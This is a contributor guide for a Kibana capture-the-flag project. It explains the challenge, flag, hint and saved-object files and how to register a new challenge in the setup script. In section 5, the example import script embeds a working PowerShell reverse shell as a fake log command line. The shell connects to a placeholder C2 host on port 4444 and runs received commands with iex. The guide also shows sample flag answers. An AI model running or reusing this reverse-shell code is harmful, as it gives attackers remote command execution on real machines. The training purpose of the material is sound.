# Instructions for Creating a New Challenge for the Kibana-CTF

## Overview
Creating a new challenge for the Kibana CTF involves setting up several files that define the challenge's details, flag, hints, and any necessary Elastic stack configurations. Follow the steps below to create a new challenge.

## Step-by-Step Instructions

### 1. Choose a Category and Challenge Number
Decide on a category for your challenge (e.g., Discover, ES|QL) and assign a unique challenge number. The structure should look like this:
```
challenges/[category]/[challenge-number]/
```

### 2. Create the ctfd_challenge.json File (Required)
Create a file named `ctfd_challenge.json` in the challenge directory. This file is required and contains all the metadata for your challenge in CTFd. The file must be a valid JSON object with the following fields:

| Field            | Type      | Description                                                                                   |
|------------------|-----------|-----------------------------------------------------------------------------------------------|
| id               | integer   | Unique challenge ID (should be unique within your set of challenges).                         |
| name             | string    | The title of the challenge.                                                                   |
| description      | string    | A detailed explanation of the challenge, can include Markdown and image links.                |
| max_attempts     | integer   | Maximum number of attempts allowed (0 for unlimited).                                         |
| value            | integer   | Points awarded for solving the challenge.                                                     |
| category         | string    | The category this challenge belongs to (e.g., "Discover", "ES|QL != SQL").                    |
| type             | string    | Challenge type, usually "standard".                                                           |
| state            | string    | Visibility state, usually "visible".                                                          |
| requirements     | object    | Prerequisites and anonymization settings.                                                     |
| connection_info  | string    | (Optional) URL or info needed to access the challenge.                                        |
| next_id          | integer   | (Optional) ID of the next challenge (if applicable).                                          |
| attribution      | string    | (Optional) Attribution or credits for the challenge.                                          |

**Example:**
```json
{
  "id": 1,
  "name": "Back to the basics",
  "description": "Discover, where it all began. I had an awesome custom search/session saved for searching on host information, but can't find it. Maybe you can help me?\r\n\r\n![old_kibana.jpg](https://www.timroes.de/static/634d0811df5e7f971ebccf819aaecd9e/3f8aa/discover-columns.png)",
  "max_attempts": 0,
  "value": 10,
  "category": "(re)Discover",
  "type": "standard",
  "state": "visible",
  "requirements": {
    "prerequisites": [],
    "anonymize": true
  },
  "connection_info": "http://127.0.0.1:5601/s/kibana-ctf/app/discover",
  "next_id": null,
  "attribution": null
}
```

### 3. Create the ctfd_flag.json File (Required)
Create a file named `ctfd_flag.json` in the challenge directory. This file should contain the actual flag that participants need to find. The format should be a JSON object with the following fields:

| Field         | Type     | Description                                                      |
|---------------|----------|------------------------------------------------------------------|
| id            | integer  | Unique flag ID.                                                  |
| challenge_id  | integer  | The ID of the challenge this flag belongs to.                    |
| type          | string   | The flag type, usually "static".                                 |
| content       | string   | The flag value participants must submit.                         |
| data          | string   | Additional flag data, e.g., "case_insensitive".                  |

**Example:**
```json
{
  "id": 1,
  "challenge_id": 1,
  "type": "static",
  "content": "{ctf_one_search_to_rule_them_all}",
  "data": "case_insensitive"
}
```

### 4. (Optional) Create a Hint File
If you want to provide hints for your challenge, create a file named `ctfd_hint.json`. This file can help participants if they get stuck. The format should be a JSON object with the following fields:

| Field         | Type     | Description                                                      |
|---------------|----------|------------------------------------------------------------------|
| id            | integer  | Unique hint ID.                                                  |
| type          | string   | Hint type, usually "standard".                                   |
| challenge_id  | integer  | The ID of the challenge this hint belongs to.                    |
| content       | string   | The hint text, can include Markdown and images.                  |
| cost          | integer  | The cost for viewing the hint (usually 0).                       |
| requirements  | object   | Prerequisites for viewing the hint.                              |

**Example:**
```json
{
  "id": 3,
  "type": "standard",
  "challenge_id": 1,
  "content": "Not the data!\n\n![](https://media1.giphy.com/media/qN9x0UIc0Rhg4/200w.gif?cid=6c09b952q6k3us6dh9m3dgek4fnqmti482nhgbfgmdk0r3mg&ep=v1_gifs_search&rid=200w.gif&ct=g)\n\nCheck out the saved search/session itself (not the queries, not the results).",
  "cost": 0,
  "requirements": {
    "prerequisites": []
  }
}
```


### 5. (Optional) Create an Elastic Import Script

If your challenge requires specific data to be set up in the Elastic stack, create a PowerShell script named `elastic_import_script.ps1` in the challenge directory. This script should define a function that builds the challenge data as a PowerShell object, converts it to JSON, and ingests it into Elasticsearch using the provided URL and helper functions.

**Key concepts:**
- Use `[PSCustomObject]` to build your event/log data.
- Include relevant fields such as `@timestamp`, `message`, `tags`, `host`, and `process`.
- Convert the object to JSON with `ConvertTo-Json`.
- Use a custom ingest URL for the challenge.
- Call a helper function (e.g., `Invoke-Ingest-Elasticsearch-Documents`) to send the data.

**Example:**
```powershell
function challenge {
    $dateNow = ($(Get-Date -AsUTC)).ToString("o")
    $challenge = [PSCustomObject]@{
        '@timestamp' = $dateNow
        message = "Just a regular event log, nothing to see here."
        tags = @("critical")
        host = [PSCustomObject]@{
            name = "not_nics_machine"
        }
        process = [PSCustomObject]@{
            name = "yams.exe"
            command_line = @'
            powershell -NoProfile -WindowStyle Hidden -Command "& {
            $host = 'not-a-malware-c2';
            $port = 4444;
            $secret_key_1 = "{ctf_flag_example}"
            $client = New-Object System.Net.Sockets.TCPClient($host, $port);
            $stream = $client.GetStream();
            [byte[]]$buffer = New-Object byte[] 1024;
            while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead);
                $result = iex $data 2>&1 | Out-String;
                $response = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($result);
                $stream.Write($response, 0, $response.Length);
                $stream.Flush();
            }
            $client.Close();
'@
        }
    } | ConvertTo-Json
    $ingestIndexIDURL = $Elasticsearch_URL+"/logs-kibana-ctf/_create/e2N0Zl93b3dfbmljZV9qb2JfZmluZGluZ190aGlzX2N1c3RvbV9pZH0"

    $result = Invoke-Ingest-Elasticsearch-Documents -documentToIngest $challenge -customUrl $ingestIndexIDURL

    return Write-Host "Challenge 5 imported." -ForegroundColor Green
}
```

**Tips:**
- Adjust the fields and values to fit your challenge scenario.
- Make sure to use the correct index and document ID for your challenge.
- Use secrets or flags in the data as needed

### 6. (Optional) Create Saved Objects File

If your challenge requires saved objects in the Elastic stack (such as saved searches, index patterns, or ES|QL queries), create a file named `elastic_saved_objects.ndjson` in the challenge directory. This file should contain one or more newline-delimited JSON (NDJSON) objects, each representing a saved object to be imported into Kibana.

**Key concepts:**
- Each line in the file is a separate JSON object.
- Saved objects can include index patterns, searches, queries, visualizations, etc.
- Use Kibana's export feature to generate these objects (Recommended!), or build them manually if needed.
- You may include references to flags or challenge data within the saved object fields.

**Example:**
```jsonl
{"attributes":{"allowHidden":false,"fieldAttrs":"{\"@timestamp\":{\"count\":2}}","fieldFormatMap":"{}","fields":"[]","name":"logs-*(ctf)","runtimeFieldMap":"{}","sourceFilters":"[]","timeFieldName":"@timestamp","title":"logs-*"},"coreMigrationVersion":"8.8.0","created_at":"2025-01-19T18:45:57.472Z","id":"86402b2c-31dd-4ded-8628-2418eaf3e445","managed":false,"references":[],"type":"index-pattern","typeMigrationVersion":"8.0.0","updated_at":"2025-01-19T19:13:43.345Z","updated_by":"u_hSeY4x75rHYs6UkRYEMwXq0BbaHhEaxeNrNVNtL632w_0","version":"WzI0NTMsMTRd"}
{"attributes":{"columns":["host.name","host.ip","host.os.name","host.os.type","host.os.version"],"description":"This search/session allows for quick and easy access to looking at some host information across the logs-* data stream.\n\nHere I am!\n{ctf_one_search_to_rule_them_all}","grid":{},"hideChart":false,"isTextBasedQuery":false,"kibanaSavedObjectMeta":{"searchSourceJSON":"{\"query\":{\"query\":\"host.* : *\",\"language\":\"kuery\"},\"filter\":[],\"indexRefName\":\"kibanaSavedObjectMeta.searchSourceJSON.index\"}"},"sort":[["@timestamp","desc"]],"timeRestore":false,"title":"[Host Info] Details"},"coreMigrationVersion":"8.8.0","created_at":"2025-01-19T18:45:57.472Z","id":"7a8a6fd9-7f55-4a48-a418-19ff7a97c96c","managed":false,"originId":"121536f2-427a-46a5-a4d0a6650d9764ca","references":[{"id":"86402b2c-31dd-4ded-8628-2418eaf3e445","name":"kibanaSavedObjectMeta.searchSourceJSON.index","type":"index-pattern"}],"type":"search","typeMigrationVersion":"10.5.0","updated_at":"2025-01-19T19:14:55.453Z","updated_by":"u_hSeY4x75rHYs6UkRYEMwXq0BbaHhEaxeNrNVNtL632w_0","version":"WzI0NTcsMTRd"}
```

**Tips:**
- Use NDJSON format for compatibility with Kibana's import/export tools.
- Include flags or clues in the description or other fields if relevant to the challenge.
- Saved objects can be imported using Kibana's UI or API.

By including saved objects, you can provide participants with pre-built searches, dashboards, or queries that are essential for solving your challenge.

### 7. Finalize Your Challenge
Once all files are created, ensure they are correctly formatted and placed in the appropriate directory structure. Test your challenge to verify that it works as intended within the CTF environment.

### 8. Update the Setup Script (Required) 

After creating your new challenge files, you must update the main setup script (`Invoke-Kibana-CTF-Setup.ps1`) so your challenge is included in the import process. This ensures your challenge, flag, hint, and any Elastic/Kibana resources are loaded during setup and testing.

**Steps:**

1. **Locate the Challenge Import Section:**  
   Find the section in `Invoke-Kibana-CTF-Setup.ps1` where challenges are imported (usually in the `Invoke-Elastic-and-CTFd-Challenges` function). These start after the comment `# Challenges Discover - Import`. Perhaps in a later release, these can simply be automatically found and added on the fly. For now, it is manual. For any assitance, use the GitHub repo Issues and ask for help!

2. **Add Your Challenge Files:**  
   Add lines to import your new challenge, flag, hint, and any scripts or saved objects. These should be added in the correct order if possible, so the below example code would fall after the Discover/10 sections of each part respectively.
   For example, if your challenge is `Discover/11`:

   ```powershell
   Invoke-Import-CTFd-Challenge './challenges/Discover/10/ctfd_challenge.json'
   New code goes here --> Invoke-Import-CTFd-Challenge './challenges/Discover/11/ctfd_challenge.json'
   ...
   Invoke-Import-CTFd-Flag './challenges/Discover/10/ctfd_flag.json'
   New code goes here --> Invoke-Import-CTFd-Flag './challenges/Discover/11/ctfd_flag.json'
   ...
   # If you have a hint:
   Invoke-Import-CTFd-Hint './challenges/Discover/10/ctfd_hint.json'
   New code goes here --> Invoke-Import-CTFd-Hint './challenges/Discover/11/ctfd_hint.json'
   ...
   # If you have an import script:
   . ./challenges/Discover/10/elastic_import_script.ps1; challenge
   New code goes here --> . ./challenges/Discover/11/elastic_import_script.ps1; challenge
   ...
   # If you have saved objects:
   Import-SavedObject "./challenges/Discover/10/elastic_saved_objects.ndjson"
   New code goes here --> Import-SavedObject "./challenges/Discover/11/elastic_saved_objects.ndjson"

   ```

3. **Test the Setup:**  
   Run the setup script and select the option to import challenges.  
   Verify your new challenge appears in CTFd and Kibana, and works as expected.

**Tip:**  
Keep your challenge imports grouped by category for clarity and maintainability.

---

By updating the setup script, you ensure your new challenge is automatically included in future deployments and tests.

## Conclusion
By following these steps, you can create a new challenge for the Kibana CTF. Make sure to test your challenge thoroughly and consider sharing it with the community!